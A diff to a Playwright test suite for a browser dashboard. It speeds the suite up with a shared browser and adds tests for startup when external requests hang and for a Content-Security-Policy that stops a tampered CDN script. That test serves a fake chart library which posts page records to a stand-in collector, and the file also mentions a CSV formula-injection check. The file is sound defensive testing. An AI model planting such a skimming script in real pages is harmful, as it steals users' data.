@@ -45,14 +45,44 @@ async function serve() {
   return { url: `http://127.0.0.1:${server.address().port}/`, close: () => new Promise((r) => server.close(r)) };
 }
 
+// One browser and one server for the whole file, a fresh context per test.
+//
+// Launching Chromium per test put nearly seven minutes on `npm test`, which is the
+// sort of cost that gets a suite excluded from the loop and then stops catching
+// anything. A context has its own storage and its own cookie jar, so the isolation
+// that actually matters here is kept.
+let shared = null;
+async function sharedBrowser() {
+  if (!shared) {
+    const site = await serve();
+    const browser = await chromium.launch({
+      executablePath: process.env.CHROMIUM_PATH || '/opt/pw-browsers/chromium-1194/chrome-linux/chrome',
+      args: ['--no-sandbox']
+    });
+    shared = { site, browser };
+  }
+  return shared;
+}
+
+test.after(async () => {
+  if (!shared) return;
+  await shared.browser.close();
+  await shared.site.close();
+  shared = null;
+});
+
 async function withPage(fn) {
-  const site = await serve();
-  const browser = await chromium.launch({
-    executablePath: process.env.CHROMIUM_PATH || '/opt/pw-browsers/chromium-1194/chrome-linux/chrome',
-    args: ['--no-sandbox']
-  });
+  const { site, browser } = await sharedBrowser();
+  const context = await browser.newContext();
+  // Nothing here reaches the network. The two CDN scripts and the webfont are
+  // refused outright, which is both faster and a more honest baseline: it is the
+  // locked-down machine the dashboard is meant to work on, and everything these
+  // tests check has to work without them.
+  await context.route('https://cdnjs.cloudflare.com/**', (route) => route.abort());
+  await context.route('https://fonts.googleapis.com/**', (route) => route.abort());
+  await context.route('https://fonts.gstatic.com/**', (route) => route.abort());
   try {
-    const page = await browser.newContext().then((c) => c.newPage());
+    const page = await context.newPage();
     const errors = [];
     page.on('pageerror', (e) => errors.push(String(e)));
     // The import path asks for confirmation; a test that cannot answer it hangs.
@@ -60,12 +90,14 @@ async function withPage(fn) {
     await page.goto(site.url);
     await page.evaluate(() => localStorage.clear());
     await page.reload();
+    // `records` is a top-level `let` in a classic script, so it is a global binding
+    // but not a property of `window`. Every evaluate below names it bare for that
+    // reason — reaching for window.records finds undefined and hangs.
     await page.waitForFunction(() => typeof records !== 'undefined');
     await fn(page, errors);
     assert.deepEqual(errors, [], 'the page threw while the test was driving it');
   } finally {
-    await browser.close();
-    await site.close();
+    await context.close();
   }
 }
 
@@ -370,4 +402,85 @@ test('an exported CSV cannot hand the recipient a formula', { skip }, async () =
     }
     assert.match(csv, /'=cmd/, 'the value is still there, marked as text');
   });
+});
+
+/* ------------------------------------------------ what the page may reach -- */
+
+// The dashboard sat blank for twelve and a half seconds on a machine that cannot
+// reach fonts.googleapis.com, because the webfont arrived as a stylesheet @import —
+// which is render-blocking and also blocks every script after it. Nothing on the
+// page needed it. This is the corporate laptop the tool is meant to run on, and the
+// whole point of the design is that it works with no network.
+test('a hanging external request does not hold the page up', { skip }, async () => {
+  const { site, browser } = await sharedBrowser();
+  const context = await browser.newContext();
+  // Hanging, not refused. A refused request fails instantly and would hide the
+  // defect entirely — what actually happened is a corporate proxy that accepts the
+  // connection and never answers, and a render-blocking @import behind it held the
+  // whole dashboard for twelve and a half seconds.
+  const hang = (route) => { /* never fulfilled, never aborted */ };
+  await context.route('https://fonts.googleapis.com/**', hang);
+  await context.route('https://fonts.gstatic.com/**', hang);
+  await context.route('https://cdnjs.cloudflare.com/**', hang);
+
+  try {
+    const page = await context.newPage();
+    page.on('dialog', (d) => d.accept());
+    const started = Date.now();
+    await page.goto(site.url, { waitUntil: 'commit' });
+    await page.waitForFunction(() => typeof records !== 'undefined', null, { timeout: 8000 });
+    const ready = Date.now() - started;
+    assert.ok(ready < 5000, `the app took ${ready}ms to start with three external requests hanging`);
+
+    // Usable, not merely started.
+    await importPayload(page, { records: [record({ id: 'r1', company: 'Apollo Tyres' })] });
+    await page.click('[data-tab="review"]');
+    assert.ok((await page.evaluate(() => document.body.innerText)).includes('Apollo Tyres'));
+  } finally {
+    await context.close();
+  }
+});
+
+// A review served a different chart.umd.min.js from a stand-in cdnjs: it read the
+// operator's API key out of the page and posted it, with every record, to a
+// collector. The Settings tab's promise that the key is held in memory for this tab
+// only is about storage, and storage was never how it left.
+//
+// connect-src is the half that can be enforced from inside the page: whatever ends up
+// running here, the only host it can send anything to is the Anthropic API.
+test('nothing on the page can send data anywhere but the Anthropic API', { skip }, async () => {
+  const { createServer } = await import('node:http');
+  const collector = createServer((req, res) => { collected.push(req.url); res.writeHead(204); res.end(); });
+  const collected = [];
+  await new Promise((r) => collector.listen(0, '127.0.0.1', r));
+  // A different origin from the page — which is what a real collector is.
+  const collectorUrl = `http://localhost:${collector.address().port}/`;
+
+  try {
+    const { site, browser } = await sharedBrowser();
+    const context = await browser.newContext();
+    await context.route('https://fonts.googleapis.com/**', (route) => route.abort());
+    // The compromised CDN.
+    await context.route('https://cdnjs.cloudflare.com/**', (route) => route.fulfill({
+      status: 200, contentType: 'text/javascript',
+      body: `window.Chart=function(){};window.Chart.register=function(){};
+             setInterval(function(){ try{
+               fetch('${collectorUrl}collect?records=' + encodeURIComponent(JSON.stringify(records).slice(0,80)));
+             }catch(e){} }, 100);`
+    }));
+    const page = await context.newPage();
+    const refusals = [];
+    page.on('console', (m) => { if (/Refused to connect/i.test(m.text())) refusals.push(m.text()); });
+    page.on('dialog', (d) => d.accept());
+    await page.goto(site.url);
+    await page.waitForFunction(() => typeof records !== 'undefined');
+    await importPayload(page, { records: [record({ id: 'r1', company: 'Apollo Tyres' })] });
+    await page.waitForTimeout(1200);
+
+    assert.deepEqual(collected, [], 'the substituted script reached a host it should not have');
+    assert.ok(refusals.length, 'and the policy is what stopped it, rather than the attempt not being made');
+    await context.close();
+  } finally {
+    await new Promise((r) => collector.close(r));
+  }
 });
